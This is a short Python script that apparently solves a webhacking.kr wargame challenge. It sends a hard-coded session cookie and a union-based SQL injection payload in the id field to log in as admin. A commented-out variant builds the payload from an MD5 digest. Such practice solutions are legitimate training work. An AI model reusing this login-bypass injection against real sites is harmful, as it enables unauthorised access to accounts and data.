import requests
import hashlib

cookies = {"PHPSESSID": "8374cd9b3e539ffbe463eafced613264"}
url = "http://webhacking.kr/challenge/bonus/bonus-13/index.php"

pw = "a"
t = hashlib.md5(pw).hexdigest().decode("hex")
#ids = "' union select 'admin',%s # " % t
ids = "' union select 'admin','a','b','a','e' #"
data = {"id": ids, "pw":pw}
r = requests.post(url, cookies=cookies, data=data)
print r.text